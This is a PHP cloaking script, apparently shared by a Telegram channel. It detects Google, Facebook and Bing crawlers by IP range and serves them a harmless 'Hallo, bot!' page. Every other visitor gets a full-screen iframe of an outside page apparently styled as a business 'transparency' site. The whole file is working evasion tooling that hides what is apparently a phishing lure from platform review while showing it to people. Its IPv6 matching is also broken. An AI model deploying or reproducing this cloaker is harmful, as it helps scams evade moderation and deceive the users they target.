<?php
//                                                      t.me/easycodex
//                                         My Cannel @fbmodfirstbook & @easycodestore
//                                                   Jangan Hapus Copyright
// Mendapatkan alamat IP Visitor
$visitor_ip = $_SERVER['REMOTE_ADDR'];

// Daftar rentang IP untuk Googlebot (IPv4)
$google_bots_ipv4 = [
    '66.249.64.0/19', '66.249.68.64/27', '66.249.68.96/27', '66.249.69.0/27', '66.249.69.128/27',
    '66.249.69.160/27', '66.249.69.192/27', '66.249.69.224/27', '66.249.69.32/27', '66.249.69.64/27',
    '66.249.69.96/27', '66.249.70.0/27', '66.249.70.128/27', '66.249.70.160/27', '66.249.70.192/27',
    '66.249.70.224/27', '66.249.70.32/27', '66.249.70.64/27', '66.249.70.96/27', '66.249.71.0/27',
    '66.249.71.128/27', '66.249.71.160/27', '66.249.71.192/27', '66.249.71.224/27', '66.249.71.32/27',
    '66.249.71.64/27', '66.249.71.96/27', '66.249.72.0/27', '66.249.72.128/27', '66.249.72.160/27',
    '66.249.72.192/27', '66.249.72.224/27', '66.249.72.32/27', '66.249.72.64/27', '66.249.72.96/27',
    '66.249.73.0/27', '66.249.73.128/27', '66.249.73.160/27', '66.249.73.192/27', '66.249.73.224/27',
    '66.249.73.32/27', '66.249.73.64/27', '66.249.73.96/27', '66.249.74.0/27', '66.249.74.128/27',
    '66.249.74.32/27', '66.249.74.64/27', '66.249.74.96/27', '66.249.75.0/27', '66.249.75.128/27',
    '66.249.75.160/27', '66.249.75.192/27', '66.249.75.224/27', '66.249.75.32/27', '66.249.75.64/27',
    '66.249.75.96/27', '66.249.76.0/27', '66.249.76.128/27', '66.249.76.160/27', '66.249.76.192/27',
    '66.249.76.224/27', '66.249.76.32/27', '66.249.76.64/27', '66.249.76.96/27', '66.249.77.0/27',
    '66.249.77.128/27', '66.249.77.160/27', '66.249.77.192/27', '66.249.77.224/27'
];

// Daftar rentang IP untuk Facebookbot (IPv4)
$facebook_bots_ipv4 = [
    '31.13.95.0/24', '69.171.239.0/24', '69.171.250.0/24', '69.171.255.0/24', '69.63.178.0/24',
];

// Daftar rentang IP untuk Bingbot (IPv4)
$bing_bots_ipv4 = [
    '40.77.0.0/17', '40.96.0.0/14', '13.82.0.0/15', '157.55.39.0/24',
];

// Daftar rentang IP untuk Googlebot (IPv6)
$google_bots_ipv6 = [
    '2001:4860:4801:60::/64', '2001:4860:4801:61::/64', '2001:4860:4801:62::/64', '2001:4860:4801:63::/64',
    '2001:4860:4801:64::/64', '2001:4860:4801:65::/64', '2001:4860:4801:66::/64', '2001:4860:4801:67::/64',
    '2001:4860:4801:68::/64', '2001:4860:4801:69::/64', '2001:4860:4801:6a::/64', '2001:4860:4801:6b::/64',
    '2001:4860:4801:6c::/64', '2001:4860:4801:6d::/64', '2001:4860:4801:6e::/64', '2001:4860:4801:6f::/64',
    '2001:4860:4801:70::/64', '2001:4860:4801:71::/64', '2001:4860:4801:72::/64'
];

// Daftar rentang IP untuk Facebookbot (IPv6)
$facebook_bots_ipv6 = [
    '2401:db00::/32', '2620:0:1cfa::/48', '2620:0:1cff::/48', '2a03:2880:f001::/48',
    '2a03:2880:f003::/48', '2a03:2880:f004::/48', '2a03:2880:f005::/48', '2a03:2880:f006::/48',
    '2a03:2880:f007::/48', '2a03:2880:f008::/48', '2a03:2880:f00a::/48'
];

// Daftar rentang IP untuk Bingbot (IPv6)
$bing_bots_ipv6 = [
    '2a01:111:200::/44', '2a01:111:202::/44', '2a01:111:204::/44',
];

// Fungsi untuk mengecek apakah IP Visitor termasuk dalam rentang IPv4
function ip_in_range_v4($ip, $range) {
    list($subnet, $bits) = explode('/', $range);
    $subnet_dec = ip2long($subnet);
    $ip_dec = ip2long($ip);
    $mask = -1 << (32 - $bits);
    return ($subnet_dec & $mask) === ($ip_dec & $mask);
}

// Fungsi untuk mengecek apakah IP Visitor termasuk dalam rentang IPv6
function ip_in_range_v6($ip, $range) {
    $range_parts = explode('/', $range);
    $subnet = inet_pton($range_parts[0]);
    $bits = isset($range_parts[1]) ? (int)$range_parts[1] : 128;

    // Konversi alamat IP Visitor menjadi biner (format IPv6)
    $ip_bin = inet_pton($ip);

    // Hitung jumlah bit yang digunakan untuk jaringan
    $mask = str_repeat('1', $bits) . str_repeat('0', 128 - $bits);
    $mask_bin = pack('H*', str_pad(bin2hex($mask), 32, '0', STR_PAD_LEFT));

    return (substr($ip_bin, 0, strlen($subnet)) === substr($mask_bin, 0, strlen($subnet)));
}

// Fungsi untuk mengecek apakah Visitor adalah bot
function is_bot($ip) {
    global $google_bots_ipv4, $facebook_bots_ipv4, $bing_bots_ipv4, $google_bots_ipv6, $facebook_bots_ipv6, $bing_bots_ipv6;

    // Cek untuk IPv4
    foreach (array_merge($google_bots_ipv4, $facebook_bots_ipv4, $bing_bots_ipv4) as $range) {
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && ip_in_range_v4($ip, $range)) {
            return true;
        }
    }

    // Cek untuk IPv6
    foreach (array_merge($google_bots_ipv6, $facebook_bots_ipv6, $bing_bots_ipv6) as $range) {
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) && ip_in_range_v6($ip, $range)) {
            return true;
        }
    }

    return false;  // Jika tidak ada yang cocok
}

// Mendapatkan alamat IP Visitor
$visitor_ip = $_SERVER['REMOTE_ADDR'];

// Deteksi apakah Visitor adalah bot
$is_bot = is_bot($visitor_ip);

// Tampilkan halaman khusus jika bot, atau tampilkan iframe jika bukan bot
if ($is_bot) {
    echo "Hallo, bot!";
} else {
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>www</title>
        <style>
            html, body {
                margin: 0;
                padding: 0;
                height: 100%;
                overflow: hidden; /* Menghilangkan scrollbar di halaman utama */
            }
    
            iframe {
                border: none; 
                width: 100vw; 
                height: 100vh; 
                overflow: hidden;
            }
        </style>
    </head>
    <body>
    
        <iframe src="https://page.transparency-business.com/" frameborder="0" id="iframe"></iframe>
    
        <script>
            window.addEventListener("load", function() {
                var iframe = document.getElementById("iframe");
    
                iframe.onload = function() {
                    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
    
                    iframeDoc.body.style.overflow = "auto";
                    iframeDoc.body.style.scrollbarWidth = "none";
                    iframeDoc.body.style.webkitOverflowScrolling = "touch";
                };
            });
        </script>
    
    </body>
    </html>';
}
?>